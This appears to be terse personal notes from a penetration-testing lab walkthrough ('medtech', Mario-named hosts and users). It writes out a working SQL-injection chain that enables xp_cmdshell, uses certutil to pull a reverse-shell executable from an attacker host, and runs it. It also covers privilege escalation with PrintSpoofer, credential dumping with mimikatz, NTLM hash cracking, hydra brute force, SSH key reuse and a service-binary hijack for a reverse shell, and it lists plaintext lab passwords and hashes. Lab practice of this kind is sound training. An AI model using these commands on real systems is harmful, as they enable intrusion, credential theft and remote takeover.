<img width="1601" height="215" alt="image" src="https://github.com/user-attachments/assets/294539d0-7616-4556-80af-aead9e376dee" />ip4 medtech  
<img width="1902" height="669" alt="image" src="https://github.com/user-attachments/assets/372bab1c-7509-4111-b0e0-969605d7b175" />

login page sql injection  
<img width="1190" height="839" alt="image" src="https://github.com/user-attachments/assets/8ecdc28f-7839-40a3-9bed-5b87db3bf0fa" />

MSSQL SHELL
<!-- 1. Enable the shell command -->
' ; EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;--

<!-- 2. msfvenom windows stageless reverse tcpx64  payload -->
' ; EXEC xp_cmdshell 'certutil -urlcache -f http://192.168.45.217/reverse.exe C:\Windows\Temp\reverse.exe';--

<!-- 3. Execute the payload -->
' ; EXEC xp_cmdshell 'C:\Windows\Temp\reverse.exe';--  

<img width="1172" height="262" alt="image" src="https://github.com/user-attachments/assets/b4e0cb6a-6366-4d36-b91d-9ccfe6cbba35" />

printspoofer for admin.

in joe downloads theres a zipped file. with web.config  
uid=sa;password=WhileChirpTuesday218

mimikatz lsadump::secrets  
joe:Flowers1
<img width="1291" height="128" alt="image" src="https://github.com/user-attachments/assets/b121be7c-a5e0-4016-a1ee-baf5dfbc01e9" />

ip5  
hydra bruteforce  
<img width="1709" height="174" alt="image" src="https://github.com/user-attachments/assets/e5bbb9d3-baf9-48ff-b6ee-b82f2c79da7e" />  
<img width="553" height="188" alt="image" src="https://github.com/user-attachments/assets/7881d09c-31e3-45b7-91c4-7257ea637b9d" />

found mario's id_rsa key  
<img width="799" height="768" alt="image" src="https://github.com/user-attachments/assets/3cb97f27-861a-4429-9fb5-1c11c55971b2" />
route  
<img width="720" height="118" alt="image" src="https://github.com/user-attachments/assets/2a093b8c-529b-4907-8504-5c786a8efefa" />

by trial and error i accessed ip8 with mario key  
<img width="1028" height="256" alt="image" src="https://github.com/user-attachments/assets/d59aa013-1921-494c-8da1-f6dd247359b8" />

nothing in root  
<img width="1601" height="215" alt="image" src="https://github.com/user-attachments/assets/1ca3cda6-8e7a-435e-b8dc-98846691b9ac" />

winrm into ip2  
<img width="1805" height="466" alt="image" src="https://github.com/user-attachments/assets/6569c0d3-10f7-46ba-8751-a2aa05fb1943" />

use semanagevolumeexploit to get proof.txt  
<img width="751" height="526" alt="image" src="https://github.com/user-attachments/assets/fc367e71-8097-4dd3-8177-0d3eb126f10d" />

in documents theres log. shows wario ntlm  fdf36048c1cf88f5630381c5e38feb8e  
└─$ hashcat -m 1000 hashes.txt --show                          
fdf36048c1cf88f5630381c5e38feb8e:Mushroom!

also daisy                        6872 Backup Completed. NTLM: abf36048c1cf88f5603381c5128feb8e 
toad                         6872 Backup Completed. NTLM: 5be63a865b65349851c1f11a067a3068  
goomba                       6872 Backup Completed. NTLM: 8e9e1516818ce4e54247e71e71b5f436

<img width="1079" height="130" alt="image" src="https://github.com/user-attachments/assets/74126c67-606b-4bd2-8782-2dc789dea06a" />

idk how to automate this. i manually went through all  
<img width="1160" height="390" alt="image" src="https://github.com/user-attachments/assets/fd283fde-43c2-48e0-91b7-a3be47b30e8f" />

winpeas  
 auditTracker(auditTracker)[C:\DevelopmentExecutables\auditTracker.exe] - Autoload - isDotNet
    File Permissions: Everyone [Allow: AllAccess], Authenticated Users [Allow: WriteData/CreateFiles]
    Possible DLL Hijacking in binary folder: C:\DevelopmentExecutables (Everyone [Allow: AllAccess], Authenticated Users [Allow: WriteData/CreateFiles])

*Evil-WinRM* PS C:\users\wario> move reverse.exe auditTracker.exe
*Evil-WinRM* PS C:\users\wario> move auditTracker.exe c:\DevelopmentExectuables\auditTracker.exe
sc.exe start auditTracker

start service to get revshell  
<img width="1468" height="212" alt="image" src="https://github.com/user-attachments/assets/3d20f86c-44d2-40b1-9884-bdd497929bcd" />

ip9
how did u get yoshi from man  
<img width="1103" height="298" alt="image" src="https://github.com/user-attachments/assets/bd65b14f-5b73-438c-bf6c-c71cd0f056bd" />

used semanagevolume to get privesc
